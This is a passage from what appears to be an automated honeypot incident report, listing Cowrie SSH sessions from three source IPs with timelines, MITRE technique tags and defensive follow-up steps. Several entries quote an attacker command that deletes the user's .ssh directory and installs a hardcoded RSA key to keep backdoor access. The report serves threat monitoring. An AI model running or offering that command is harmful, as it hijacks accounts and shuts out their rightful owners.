| `2026-05-23 18:07:39` | `cowrie.command.failed` |
| `2026-05-23 18:07:39` | `cowrie.log.closed` |
| `2026-05-23 18:07:39` | `cowrie.session.params` |
| `2026-05-23 18:07:39` | `cowrie.command.input` |
| `2026-05-23 18:07:39` | `cowrie.session.file_download` |
| `2026-05-23 18:07:39` | `cowrie.log.closed` |
| `2026-05-23 18:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3bea0c0723d

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:07 |
| **Last Seen** | 2026-05-23 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:07:41` | `cowrie.session.connect` |
| `2026-05-23 18:07:41` | `cowrie.client.version` |
| `2026-05-23 18:07:41` | `cowrie.client.kex` |
| `2026-05-23 18:07:41` | `cowrie.login.success` |
| `2026-05-23 18:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3484ec6a461

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:10 |
| **Last Seen** | 2026-05-23 18:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:10:23` | `cowrie.session.connect` |
| `2026-05-23 18:10:23` | `cowrie.client.version` |
| `2026-05-23 18:10:23` | `cowrie.client.kex` |
| `2026-05-23 18:10:23` | `cowrie.login.success` |
| `2026-05-23 18:10:24` | `cowrie.session.params` |
| `2026-05-23 18:10:24` | `cowrie.command.input` |
| `2026-05-23 18:10:24` | `cowrie.command.failed` |
| `2026-05-23 18:10:24` | `cowrie.log.closed` |
| `2026-05-23 18:10:24` | `cowrie.session.params` |
| `2026-05-23 18:10:24` | `cowrie.command.input` |
| `2026-05-23 18:10:24` | `cowrie.session.file_download` |
| `2026-05-23 18:10:24` | `cowrie.log.closed` |
| `2026-05-23 18:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-674e12ca41bd

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:10 |
| **Last Seen** | 2026-05-23 18:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:10:26` | `cowrie.session.connect` |
| `2026-05-23 18:10:26` | `cowrie.client.version` |
| `2026-05-23 18:10:26` | `cowrie.client.kex` |
| `2026-05-23 18:10:27` | `cowrie.login.success` |
| `2026-05-23 18:10:28` | `cowrie.session.params` |
| `2026-05-23 18:10:28` | `cowrie.command.input` |
| `2026-05-23 18:10:28` | `cowrie.command.failed` |
| `2026-05-23 18:10:29` | `cowrie.log.closed` |
| `2026-05-23 18:10:29` | `cowrie.session.params` |
| `2026-05-23 18:10:29` | `cowrie.command.input` |
| `2026-05-23 18:10:29` | `cowrie.session.file_download` |
| `2026-05-23 18:10:29` | `cowrie.log.closed` |
| `2026-05-23 18:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ed32c750c0

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:10 |
| **Last Seen** | 2026-05-23 18:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:10:26` | `cowrie.session.connect` |
| `2026-05-23 18:10:26` | `cowrie.client.version` |
| `2026-05-23 18:10:26` | `cowrie.client.kex` |
| `2026-05-23 18:10:27` | `cowrie.login.success` |
| `2026-05-23 18:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc059758c8a8

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:10 |
| **Last Seen** | 2026-05-23 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:10:32` | `cowrie.session.connect` |
| `2026-05-23 18:10:32` | `cowrie.client.version` |
| `2026-05-23 18:10:33` | `cowrie.client.kex` |
| `2026-05-23 18:10:34` | `cowrie.login.success` |
| `2026-05-23 18:10:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aeb03716fd5

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:11 |
| **Last Seen** | 2026-05-23 18:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:11:37` | `cowrie.session.connect` |
| `2026-05-23 18:11:37` | `cowrie.client.version` |
| `2026-05-23 18:11:37` | `cowrie.client.kex` |
| `2026-05-23 18:11:37` | `cowrie.login.success` |
| `2026-05-23 18:11:38` | `cowrie.session.params` |
| `2026-05-23 18:11:38` | `cowrie.command.input` |
| `2026-05-23 18:11:38` | `cowrie.command.failed` |
| `2026-05-23 18:11:38` | `cowrie.log.closed` |
| `2026-05-23 18:11:38` | `cowrie.session.params` |
| `2026-05-23 18:11:38` | `cowrie.command.input` |
| `2026-05-23 18:11:38` | `cowrie.session.file_download` |
| `2026-05-23 18:11:38` | `cowrie.log.closed` |
| `2026-05-23 18:11:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a3e10a6e914

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:11 |
| **Last Seen** | 2026-05-23 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:11:40` | `cowrie.session.connect` |
| `2026-05-23 18:11:40` | `cowrie.client.version` |
| `2026-05-23 18:11:40` | `cowrie.client.kex` |
| `2026-05-23 18:11:40` | `cowrie.login.success` |
| `2026-05-23 18:11:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3f7d6f8315c

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:14 |
| **Last Seen** | 2026-05-23 18:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:14:25` | `cowrie.session.connect` |
| `2026-05-23 18:14:25` | `cowrie.client.version` |
| `2026-05-23 18:14:25` | `cowrie.client.kex` |
| `2026-05-23 18:14:26` | `cowrie.login.success` |
| `2026-05-23 18:14:26` | `cowrie.session.params` |
| `2026-05-23 18:14:26` | `cowrie.command.input` |
| `2026-05-23 18:14:26` | `cowrie.command.failed` |
| `2026-05-23 18:14:27` | `cowrie.log.closed` |
| `2026-05-23 18:14:27` | `cowrie.session.params` |
| `2026-05-23 18:14:27` | `cowrie.command.input` |
| `2026-05-23 18:14:27` | `cowrie.session.file_download` |
| `2026-05-23 18:14:27` | `cowrie.log.closed` |
| `2026-05-23 18:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03305f6bbb1e

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:14 |
| **Last Seen** | 2026-05-23 18:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:14:29` | `cowrie.session.connect` |
| `2026-05-23 18:14:29` | `cowrie.client.version` |
| `2026-05-23 18:14:29` | `cowrie.client.kex` |
| `2026-05-23 18:14:30` | `cowrie.login.success` |
| `2026-05-23 18:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9112b7405db5

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:15 |
| **Last Seen** | 2026-05-23 18:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:15:35` | `cowrie.session.connect` |
| `2026-05-23 18:15:35` | `cowrie.client.version` |
| `2026-05-23 18:15:35` | `cowrie.client.kex` |
| `2026-05-23 18:15:35` | `cowrie.login.success` |
| `2026-05-23 18:15:35` | `cowrie.session.params` |
| `2026-05-23 18:15:35` | `cowrie.command.input` |
| `2026-05-23 18:15:35` | `cowrie.command.failed` |
| `2026-05-23 18:15:35` | `cowrie.log.closed` |
| `2026-05-23 18:15:36` | `cowrie.session.params` |
| `2026-05-23 18:15:36` | `cowrie.command.input` |
| `2026-05-23 18:15:36` | `cowrie.session.file_download` |
| `2026-05-23 18:15:36` | `cowrie.log.closed` |
| `2026-05-23 18:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8424cd2dae3f

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:15 |
| **Last Seen** | 2026-05-23 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:15:37` | `cowrie.session.connect` |
| `2026-05-23 18:15:37` | `cowrie.client.version` |
| `2026-05-23 18:15:37` | `cowrie.client.kex` |
| `2026-05-23 18:15:38` | `cowrie.login.success` |
| `2026-05-23 18:15:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-000dcb339985

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:18 |
| **Last Seen** | 2026-05-23 18:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:18:31` | `cowrie.session.connect` |
| `2026-05-23 18:18:31` | `cowrie.client.version` |
| `2026-05-23 18:18:31` | `cowrie.client.kex` |
| `2026-05-23 18:18:32` | `cowrie.login.success` |
| `2026-05-23 18:18:32` | `cowrie.session.params` |
| `2026-05-23 18:18:32` | `cowrie.command.input` |
| `2026-05-23 18:18:32` | `cowrie.command.failed` |
| `2026-05-23 18:18:32` | `cowrie.log.closed` |
| `2026-05-23 18:18:32` | `cowrie.session.params` |
| `2026-05-23 18:18:32` | `cowrie.command.input` |
| `2026-05-23 18:18:33` | `cowrie.session.file_download` |
| `2026-05-23 18:18:33` | `cowrie.log.closed` |
| `2026-05-23 18:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6f9344e05ad

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:18 |
| **Last Seen** | 2026-05-23 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:18:35` | `cowrie.session.connect` |
| `2026-05-23 18:18:35` | `cowrie.client.version` |
| `2026-05-23 18:18:35` | `cowrie.client.kex` |
| `2026-05-23 18:18:35` | `cowrie.login.success` |
| `2026-05-23 18:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e552a295e6

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:19 |
| **Last Seen** | 2026-05-23 18:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:19:36` | `cowrie.session.connect` |
| `2026-05-23 18:19:36` | `cowrie.client.version` |
| `2026-05-23 18:19:36` | `cowrie.client.kex` |
| `2026-05-23 18:19:37` | `cowrie.login.success` |
| `2026-05-23 18:19:37` | `cowrie.session.params` |
| `2026-05-23 18:19:37` | `cowrie.command.input` |
| `2026-05-23 18:19:37` | `cowrie.command.failed` |
| `2026-05-23 18:19:37` | `cowrie.log.closed` |
| `2026-05-23 18:19:37` | `cowrie.session.params` |
| `2026-05-23 18:19:37` | `cowrie.command.input` |
| `2026-05-23 18:19:37` | `cowrie.session.file_download` |
| `2026-05-23 18:19:37` | `cowrie.log.closed` |
| `2026-05-23 18:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72a4404448c

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:19 |
| **Last Seen** | 2026-05-23 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:19:39` | `cowrie.session.connect` |
| `2026-05-23 18:19:39` | `cowrie.client.version` |
| `2026-05-23 18:19:39` | `cowrie.client.kex` |
| `2026-05-23 18:19:39` | `cowrie.login.success` |
| `2026-05-23 18:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf0f5856db6

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:22 |
| **Last Seen** | 2026-05-23 18:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:22:29` | `cowrie.session.connect` |
| `2026-05-23 18:22:29` | `cowrie.client.version` |
| `2026-05-23 18:22:29` | `cowrie.client.kex` |
| `2026-05-23 18:22:30` | `cowrie.login.success` |
| `2026-05-23 18:22:30` | `cowrie.session.params` |
| `2026-05-23 18:22:30` | `cowrie.command.input` |
| `2026-05-23 18:22:30` | `cowrie.command.failed` |
| `2026-05-23 18:22:31` | `cowrie.log.closed` |
| `2026-05-23 18:22:31` | `cowrie.session.params` |
| `2026-05-23 18:22:31` | `cowrie.command.input` |
| `2026-05-23 18:22:32` | `cowrie.session.file_download` |
| `2026-05-23 18:22:32` | `cowrie.log.closed` |
| `2026-05-23 18:22:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9c2f419a8da

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:22 |
| **Last Seen** | 2026-05-23 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:22:35` | `cowrie.session.connect` |
| `2026-05-23 18:22:35` | `cowrie.client.version` |
| `2026-05-23 18:22:35` | `cowrie.client.kex` |
| `2026-05-23 18:22:36` | `cowrie.login.success` |
| `2026-05-23 18:22:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d36df28284

